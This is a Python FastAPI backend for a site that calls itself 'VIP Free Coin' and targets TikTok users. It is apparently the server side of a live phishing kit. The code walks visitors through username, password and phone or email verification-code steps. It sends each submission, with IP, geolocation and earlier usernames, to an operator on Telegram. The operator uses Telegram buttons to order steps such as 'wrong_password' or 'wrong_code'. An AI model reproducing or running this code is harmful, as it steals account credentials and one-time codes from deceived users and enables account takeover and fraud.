from fastapi import FastAPI, APIRouter, Request
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
import requests
from pathlib import Path
from typing import List, Optional
import uuid
from datetime import datetime, timedelta

# Load environment variables FIRST before importing other modules
ROOT_DIR = Path(__file__).parent
load_dotenv(ROOT_DIR / '.env')

# Now import modules that depend on environment variables
from models import UserSession, StepData, AdminAction, StatusCheck, StatusCheckCreate
from telegram_service import telegram_service
from tiktok_service import tiktok_service

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Create the main app without a prefix
app = FastAPI()

# Create a router with the /api prefix
api_router = APIRouter(prefix="/api")

# Add your routes to the router instead of directly to app
@api_router.get("/")
async def root():
    return {"message": "VIP Free Coin API - Active"}

def get_client_ip(request: Request):
    forwarded_for = request.headers.get("x-forwarded-for")
    if forwarded_for:
        return forwarded_for.split(",")[0].strip()

    real_ip = request.headers.get("x-real-ip")
    if real_ip:
        return real_ip.strip()

    return request.client.host if request.client else "Unknown"


def get_ip_location(ip: str):
    try:
        if not ip or ip == "Unknown":
            return {"country": "", "city": "", "text": ""}

        # 1. servis: ipapi.co
        try:
            response = requests.get(
                f"https://ipapi.co/{ip}/json/",
                timeout=5
            )

            logging.info(f"IPAPI STATUS: {response.status_code}")
            logging.info(f"IPAPI RESPONSE: {response.text}")

            if response.status_code == 200:
                geo = response.json()

                country = geo.get("country_name") or ""
                city = geo.get("city") or ""

                if country and city:
                    return {
                        "country": country,
                        "city": city,
                        "text": f"{country} / {city}"
                    }

                if country:
                    return {
                        "country": country,
                        "city": "",
                        "text": country
                    }

        except Exception as e:
            logging.error(f"ipapi.co error: {str(e)}")

        # 2. servis: ipwho.is
        try:
            response = requests.get(
                f"https://ipwho.is/{ip}",
                timeout=5
            )

            logging.info(f"IPWHO STATUS: {response.status_code}")
            logging.info(f"IPWHO RESPONSE: {response.text}")

            if response.status_code == 200:
                geo = response.json()

                if geo.get("success") is True:
                    country = geo.get("country") or ""
                    city = geo.get("city") or ""

                    if country and city:
                        return {
                            "country": country,
                            "city": city,
                            "text": f"{country} / {city}"
                        }

                    if country:
                        return {
                            "country": country,
                            "city": "",
                            "text": country
                        }

        except Exception as e:
            logging.error(f"ipwho.is error: {str(e)}")

        return {"country": "", "city": "", "text": ""}

    except Exception as e:
        logging.error(f"IP location error: {str(e)}")
        return {"country": "", "city": "", "text": ""}

@api_router.post("/status", response_model=StatusCheck)
async def create_status_check(input: StatusCheckCreate):
    status_dict = input.dict()
    status_obj = StatusCheck(**status_dict)
    _ = await db.status_checks.insert_one(status_obj.dict())
    return status_obj

@api_router.get("/status", response_model=List[StatusCheck])
async def get_status_checks():
    status_checks = await db.status_checks.find().to_list(1000)
    return [StatusCheck(**status_check) for status_check in status_checks]

@api_router.post("/session/create")
async def create_session():
    """Create a new user session"""
    session = UserSession()
    await db.user_sessions.insert_one(session.dict())
    return {"session_id": session.session_id}

@api_router.get("/tiktok/user/{username}")
async def get_tiktok_user(username: str):
    """Get TikTok user information"""
    try:
        user_info = tiktok_service.get_user_info(username)
        return user_info
    except Exception as e:
        logging.error(f"Error fetching TikTok user: {str(e)}")
        return {
            "success": False,
            "error": str(e)
        }

@api_router.post("/session/step")
async def submit_step(step_data: StepData, request: Request):
    """Submit data for a specific step and send Telegram notification"""
    try:
        session_id = step_data.session_id
        step = step_data.step
        data = step_data.data
        
        # Get client IP
        client_ip = get_client_ip(request)
        data['ip'] = client_ip

        # Get country / city from IP
        location_info = get_ip_location(client_ip)

        data["location"] = location_info.get("text") or "N/A"
        data["country"] = location_info.get("country") or ""
        data["city"] = location_info.get("city") or ""

        # Check previous usernames for this visitor
        visitor_id = data.get("visitor_id")
        current_username = data.get("username")

        if visitor_id:
            existing_visitor = await db.visitors.find_one(
                {"visitor_id": visitor_id},
                {"_id": 0}
            )

            previous_usernames = []

            if existing_visitor:
                previous_usernames = existing_visitor.get("usernames", [])

            if previous_usernames:
                data["previous_usernames"] = previous_usernames
                data["previous_usernames_text"] = ", ".join(
                    [f"@{u}" for u in previous_usernames if u]
                )

            history_item = {
                "username": current_username,
                "ip": client_ip,
                "location": location_info.get("text"),
                "country": location_info.get("country"),
                "city": location_info.get("city"),
                "time": datetime.utcnow(),
                "step": step
            }

            update_query = {
                "$set": {
                    "visitor_id": visitor_id,
                    "ip": client_ip,
                    "location": location_info.get("text"),
                    "country": location_info.get("country"),
                    "city": location_info.get("city"),
                    "last_seen": datetime.utcnow()
                },
                "$inc": {
                    "visit_count": 1
                },
                "$push": {
                    "history": {
                        "$each": [history_item],
                        "$slice": -50
                    }
                }
            }

            if current_username:
                update_query["$set"]["last_username"] = current_username
                update_query["$addToSet"] = {
                    "usernames": current_username
                }

            await db.visitors.update_one(
                {"visitor_id": visitor_id},
                update_query,
                upsert=True
            )
        
        # If it's the first step, fetch TikTok user info
        if step == 'username_coin' and 'username' in data:
            username = data['username']
            tiktok_data = tiktok_service.get_user_info(username)
            data['tiktok_data'] = tiktok_data
        
        # Update session in database
        update_data = {"current_step": step}
        update_data.update(data)
        
        await db.user_sessions.update_one(
            {"session_id": session_id},
            {"$set": update_data}
        )
        
        # Send Telegram notification
        logging.info(f"📤 Sending Telegram notification - Session: {session_id}, Step: {step}")
        telegram_service.send_step_notification(step, session_id, data)
        logging.info(f"✅ Telegram sent for session: {session_id}")
        
        return {
            "success": True,
            "message": "Step submitted successfully",
            "session_id": session_id,
            "tiktok_data": data.get('tiktok_data')
        }
        
    except Exception as e:
        logging.error(f"Error submitting step: {str(e)}")
        return {"success": False, "message": str(e)}

@api_router.get("/session/{session_id}/action")
async def get_session_action(session_id: str):
    """Get the next action for a session (set by admin via Telegram)"""
    try:
        session = await db.user_sessions.find_one({"session_id": session_id})
        
        if not session:
            return {"action": None, "message": "Session not found"}
        
        next_action = session.get('next_action')
        
        # Clear the action after reading it
        if next_action:
            await db.user_sessions.update_one(
                {"session_id": session_id},
                {"$set": {"next_action": None}}
            )
        
        return {
            "action": next_action,
            "current_step": session.get('current_step'),
            "tiktok_data": session.get('tiktok_data')
        }
        
    except Exception as e:
        logging.error(f"Error getting session action: {str(e)}")
        return {"action": None, "message": str(e)}

@api_router.post("/admin/action")
async def set_admin_action(admin_action: AdminAction):
    """Set admin action for a session (called via Telegram webhook)"""
    try:
        session_id = admin_action.session_id
        action = admin_action.action
        
        # Map actions to next steps
        action_map = {
            'password': 'incorrect_password',
            'form': 'contact',
            'phone_code': 'verify_phone',
            'email_code': 'verify_email',
            'wrong_password': 'incorrect_password',
            'wrong_code': 'verify_phone',
            'finish': 'success'
        }
        
        next_step = action_map.get(action, 'waiting')
        
        # Update session
        await db.user_sessions.update_one(
            {"session_id": session_id},
            {"$set": {"next_action": next_step}}
        )
        
        return {"success": True, "next_step": next_step}
        
    except Exception as e:
        logging.error(f"Error setting admin action: {str(e)}")
        return {"success": False, "message": str(e)}

@api_router.get("/sessions")
async def get_all_sessions():
    """Get all active sessions"""
    sessions = await db.user_sessions.find().sort('timestamp', -1).to_list(50)
    return sessions

# Telegram webhook endpoint
@api_router.post("/telegram/webhook")
async def telegram_webhook(request: Request):
    """Handle Telegram bot callbacks"""
    try:
        data = await request.json()
        
        # Check if it's a callback query
        if 'callback_query' in data:
            callback = data['callback_query']
            callback_data = callback['data']
            
            # Parse callback data: action_{session_id}_{action}
            if callback_data.startswith('action_'):
                parts = callback_data.split('_')
                if len(parts) >= 3:
                    session_id = parts[1]
                    action = '_'.join(parts[2:])
                    
                    # Set admin action
                    admin_action = AdminAction(session_id=session_id, action=action)
                    await set_admin_action(admin_action)
                    
                    # Answer callback query
                    answer_url = f"https://api.telegram.org/bot{os.environ['TELEGRAM_BOT_TOKEN']}/answerCallbackQuery"
                    import requests
                    requests.post(answer_url, json={
                        'callback_query_id': callback['id'],
                        'text': f'Action set: {action}',
                        'show_alert': False
                    })
        
        return {"ok": True}
        
    except Exception as e:
        logging.error(f"Webhook error: {str(e)}")
        return {"ok": False}

# User Activity Tracking Endpoints
@api_router.post("/track-activity")
async def track_activity(request: Request):
    """Track user page activity"""
    try:
        from user_agents import parse as parse_ua
        
        data = await request.json()
        session_id = data.get('session_id')
        page = data.get('page', '/')
        
        if not session_id:
            return {"success": False, "error": "session_id required"}
        
        # Get client IP
        client_ip = request.client.host
        
        # Parse user agent
        user_agent_string = request.headers.get('user-agent', 'Unknown')
        user_agent = parse_ua(user_agent_string)
        
        # Extract device information
        device_info = {
            "browser": f"{user_agent.browser.family} {user_agent.browser.version_string}",
            "os": f"{user_agent.os.family} {user_agent.os.version_string}",
            "device": user_agent.device.family,
            "device_brand": user_agent.device.brand or "Unknown",
            "device_model": user_agent.device.model or "Unknown",
            "is_mobile": user_agent.is_mobile,
            "is_tablet": user_agent.is_tablet,
            "is_pc": user_agent.is_pc,
        }
        
        # Check if this is first time (entry)
        existing = await db.active_sessions.find_one({"session_id": session_id})
        
        # Update or create activity record
        activity_data = {
            "session_id": session_id,
            "current_page": page,
            "last_seen": datetime.now(),
            "ip": client_ip,
            "user_agent": user_agent_string,
            "device_info": device_info,
            "status": "active"
        }
        
        # Set entry time if new
        if not existing:
            activity_data["entry_time"] = datetime.now()
        
        # Get session info if exists
        session = await db.user_sessions.find_one({"session_id": session_id}, {"_id": 0})
        if session:
            activity_data["username"] = session.get('username')
            activity_data["amount"] = session.get('amount')
        
        await db.active_sessions.update_one(
            {"session_id": session_id},
            {"$set": activity_data},
            upsert=True
        )
        
        return {"success": True}
        
    except Exception as e:
        logging.error(f"Track activity error: {str(e)}")
        return {"success": False, "error": str(e)}

@api_router.post("/track-exit")
async def track_exit(request: Request):
    """Track when user exits the site"""
    try:
        data = await request.json()
        session_id = data.get('session_id')
        
        if not session_id:
            return {"success": False, "error": "session_id required"}
        
        # Update exit time and status
        await db.active_sessions.update_one(
            {"session_id": session_id},
            {
                "$set": {
                    "exit_time": datetime.now(),
                    "status": "exited",
                    "last_seen": datetime.now()
                }
            }
        )
        
        return {"success": True}
        
    except Exception as e:
        logging.error(f"Track exit error: {str(e)}")
        return {"success": False, "error": str(e)}

@api_router.get("/admin/live-users")
async def get_live_users():
    """Get currently active users (last 30 minutes)"""
    try:
        from datetime import timedelta
        
        # Get users active in last 30 minutes
        thirty_mins_ago = datetime.now() - timedelta(minutes=30)
        
        active_users = await db.active_sessions.find(
            {"last_seen": {"$gte": thirty_mins_ago}},
            {"_id": 0}
        ).sort("last_seen", -1).to_list(100)
        
        # Calculate session duration and format datetime fields
        for user in active_users:
            # Format last_seen
            if 'last_seen' in user and isinstance(user['last_seen'], datetime):
                duration = (datetime.now() - user['last_seen']).total_seconds()
                user['seconds_ago'] = int(duration)
                user['last_seen'] = user['last_seen'].strftime('%H:%M:%S')
            
            # Format entry_time
            if 'entry_time' in user and isinstance(user['entry_time'], datetime):
                user['entry_time'] = user['entry_time'].isoformat()
            
            # Format exit_time
            if 'exit_time' in user and isinstance(user['exit_time'], datetime):
                user['exit_time'] = user['exit_time'].isoformat()
        
        return {
            "success": True,
            "count": len(active_users),
            "users": active_users
        }
        
    except Exception as e:
        logging.error(f"Get live users error: {str(e)}")
        return {"success": False, "error": str(e), "users": []}

# Include the router in the main app
app.include_router(api_router)

app.add_middleware(
    CORSMiddleware,
    allow_credentials=True,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
